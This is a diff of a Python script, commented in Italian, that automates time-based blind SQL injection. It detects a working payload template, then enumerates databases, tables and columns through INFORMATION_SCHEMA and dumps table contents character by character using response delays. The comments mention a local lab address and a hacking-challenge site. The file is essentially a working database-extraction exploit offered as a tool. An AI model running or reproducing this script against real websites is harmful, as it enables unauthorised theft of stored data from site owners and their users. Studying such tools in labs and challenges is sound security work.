@@ -6,10 +6,11 @@ import re
 #Usando python bisogna ricordarsi di convertire tutti gli indici usati come interi in str prima di concatenarli
 
 isGet = True
-inxTemplate = 2
+inxTemplate = 0
 
 #payload base
 #http://192.168.33.10/sqli/time_based_blind.php?email=arthur@guide.com
+#http://vip.hacking.w3challs.com/index.php?page=contact
 
 # format(sleeptime, column_name, tabledb_name, row, underscores)
 templatesLength = [
@@ -42,17 +43,29 @@ templatesTest = [
 def findTemplate(url, sleeptime):
     global inxTemplate
     for i in range (0, len(templatesTest)):
-        payload = templatesTest[i].format(sleeptime)
-        #payload2 = "shishkebbab"
+        if(isGet):
+            payload = templatesTest[i].format(sleeptime)
+
+        #divisione della stringa in forma "arg1=par1&arg2=par2" in lista
+        else:
+            listParams = re.split('&|=', params)
+            
+            payload = {}
+            for j in range(0, len(listParams)-1, 2):
+                if(listParams[j+1] == '{0}'):   #Si inserisce query nel payload
+                    payload[listParams[j]] = templatesTest[i].format(sleeptime)
+                else:
+                    payload[listParams[j]] = listParams[j+1]
+
         if(request(url, payload, sleeptime)):
             inxTemplate = i
-            print(inxTemplate)
+            #print(inxTemplate)
             return
 
 
 #Trova il valore di una cella di una tabella, dopo aver trovato il DB, la tabella e la colonna.
 def findCellValue(url, tabledb_name, row, column_name, params, sleeptime):
-    print("findCellValue length")
+    #print("findCellValue length")
     length=0
     undersc = []  #Vettore di caratteri underscore
     concatList = ["CHAR(", "95"]
@@ -84,10 +97,10 @@ def findCellValue(url, tabledb_name, row, column_name, params, sleeptime):
         #Quando la query fa a buon fine salvo la lunghezza trovata ( es.nome lenght nome DB )
         if(request(url, payload, sleeptime)):
             length=i
-            print(length)
+            #print(length)
             break
 
-    print("findCellValue value")
+    #print("findCellValue value")
     string = []
     for pos in range(0, length):    #posizione del carattere
         for i in range(46, 122):    #char in codifica ascii
@@ -104,25 +117,25 @@ def findCellValue(url, tabledb_name, row, column_name, params, sleeptime):
                     else:
                         payload[listParams[j]] = listParams[j+1]
 
-
+            print('.', end=" ", flush=True)
+            
             #Se la query va a buon fine, aggiungo il carattere trovato alla stringa
             if(request(url, payload, sleeptime)):
                 string.append(chr(i))
-                print(string)
                 break
-    
+                
     return ''.join(string) #Compatto tutti i caratteri
 
 #Trova numero delle righe di una tabella
 def findNumRows(url, tabledb_name, params, sleeptime):
-    print("findNumRows")
+    #print("findNumRows")
     numrows=0
     for i in range(1, 100):
         if(isGet):
             payload = templatesNumRows[inxTemplate].format(tabledb_name, i, sleeptime)
         else:
             #Costruzione dizionario
-            #divisione della stringa in forma "arg1=par1%arg2=par2" in lista
+            #divisione della stringa in forma "arg1=par1&arg2=par2" in lista
             listParams = re.split('&|=', params)
             
             payload = {}
@@ -139,7 +152,7 @@ def findNumRows(url, tabledb_name, params, sleeptime):
             numrows=i
             break
 
-    print(numrows)
+    #print(numrows)
     return numrows
 
 #Effettua la richiesta al sito per la ricerca dei valori/db/tabelle
@@ -169,16 +182,21 @@ def requestTime(url, payload):
     
 #stampa i nomi dei db
 def findDbNames(url, params, sleeptime):
+    dbs = []
     numDbs = findNumRows(url, "INFORMATION_SCHEMA.SCHEMATA", params, sleeptime)
     for i in range(0, numDbs):
-        print(findCellValue(url, "INFORMATION_SCHEMA.SCHEMATA", i, "schema_name", params, sleeptime))
+        dbs.append(findCellValue(url, "INFORMATION_SCHEMA.SCHEMATA", i, "schema_name", params, sleeptime))
+   
+    return dbs
 
 #stampa i nomi delle tabelle
 def findTableNames(url, dbname, params, sleeptime):
     numTbls = findNumRows(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), params, sleeptime)
-    print(numTbls)
+    #print(numTbls)
+    tbls = []
     for i in range(0, numTbls):
-        print(findCellValue(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), i, "table_name", params, sleeptime))
+        tbls.append(findCellValue(url, "INFORMATION_SCHEMA.TABLES WHERE table_schema="+ convertToChar(dbname), i, "table_name", params, sleeptime))
+    return tbls
 
 #Ritorna i nomi delle colonne
 def findColumnNames(url, dbname, tablename, params, sleeptime):
@@ -198,12 +216,14 @@ def findColumnNames(url, dbname, tablename, params, sleeptime):
 
 #stampa il contenuto di una tabella
 def findTableContent(url, dbname, tablename, columns, params, sleeptime):
+    listRows =[]
     numrows=findNumRows(url, tablename, params, sleeptime)
     for temp in range(0, numrows):
         tempRow=[]
         for column_name in columns:
             tempRow.append(findCellValue(url, dbname+"."+tablename, temp, column_name, params, sleeptime))
-        print(tempRow)
+        listRows.append(tempRow)
+    return listRows
 
 
 def convertToChar(string):
@@ -265,16 +285,26 @@ if(args.db is not None):
     print(args.db)
     rit = calcRitardo(args.db[0])
     findTemplate(args.db[0], rit)
-    findDbNames(args.db[0], params, rit)
+    DbNames = findDbNames(args.db[0], params, rit)
+    print("")
+    print("Elenco DB Disponibili for Hacking ")
+    print(DbNames)
 
 if(args.tbl is not None):
     rit = calcRitardo(args.tbl[0])
     findTemplate(args.tbl[0], rit)
-    findTableNames(args.tbl[0], args.tbl[1], params, rit)
+    tblsName = findTableNames(args.tbl[0], args.tbl[1], params, rit)
+    print("")
+    print("Elenco Tabelle del DB " + args.tbl[1])
+    print(tblsName)
 
 if(args.all is not None):
     rit = calcRitardo(args.all[0])
     findTemplate(args.all[0], rit)
     colNames = findColumnNames(args.all[0], args.all[1], args.all[2], params, rit)
+    ValCell= findTableContent(args.all[0], args.all[1], args.all[2], colNames, params, rit)
+    print("")
+    print("Dump della tabella " + args.all[2] + " del DB " + args.all[1] )
     print(colNames)
-    findTableContent(args.all[0], args.all[1], args.all[2], colNames, params, rit)
+    for s in ValCell:
+        print(s)
